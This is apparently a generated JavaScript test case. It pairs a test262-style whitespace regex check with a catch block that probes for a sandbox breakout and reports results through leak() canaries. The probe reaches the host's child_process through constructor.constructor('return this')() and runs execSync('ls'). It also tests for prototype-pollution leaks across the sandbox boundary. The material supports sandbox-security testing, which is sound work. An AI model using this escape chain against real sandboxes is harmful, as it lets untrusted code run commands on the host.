try {
    const str = buildString({
        loneCodePoints: [
            32,
            160,
            5760,
            8239,
            8287,
            12288,
            65279
        ],
        ranges: [
            [
                9,
                13
            ],
            [
                8192,
                8202
            ],
            [
                8232,
                8233
            ]
        ]
    });
    const re = /\s+/g;
    const errors = [];
    if (!re.test(str)) {
        for (const char of str) {
            if (!re.test(char)) {
                errors.push('0x' + char.codePointAt(0).toString(16));
            }
        }
    }
    assert.sameValue(errors.length, 0, 'Expected matching code points, but received: ' + errors.join(','));
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}